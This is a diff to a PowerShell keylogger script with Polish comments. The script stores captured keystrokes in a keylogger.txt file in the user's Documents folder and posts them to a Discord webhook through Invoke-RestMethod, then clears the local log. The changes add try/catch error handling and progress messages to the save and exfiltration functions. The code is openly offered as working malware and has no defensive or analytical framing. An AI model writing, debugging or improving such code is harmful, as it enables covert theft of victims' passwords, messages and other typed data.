@@ -1,7 +1,7 @@
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-# Ścieżka do pliku logu
+# Ścieżka do pliku logu - zmiana na Documents
 $logPath = "$env:USERPROFILE\Documents\keylogger.txt"
 
 # Webhook Discorda
@@ -12,8 +12,13 @@ $global:loggedKeys = ""
 
 # Funkcja zapisu logów
 function Save-Log {
-    $global:loggedKeys | Out-File -Append -Encoding UTF8 -FilePath $logPath
-    $global:loggedKeys = ""
+    try {
+        Write-Host "Zapisuję logi do pliku: $logPath"
+        $global:loggedKeys | Out-File -Append -Encoding UTF8 -FilePath $logPath
+        $global:loggedKeys = ""
+    } catch {
+        Write-Host "Błąd zapisu logów: $_"
+    }
 }
 
 # Funkcja wysyłania na Discord
@@ -31,6 +36,7 @@ function Send-To-Discord {
             } | ConvertTo-Json -Depth 10
 
             try {
+                Write-Host "Wysyłam logi na Discorda..."
                 Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json'
                 Clear-Content -Path $logPath
             } catch {
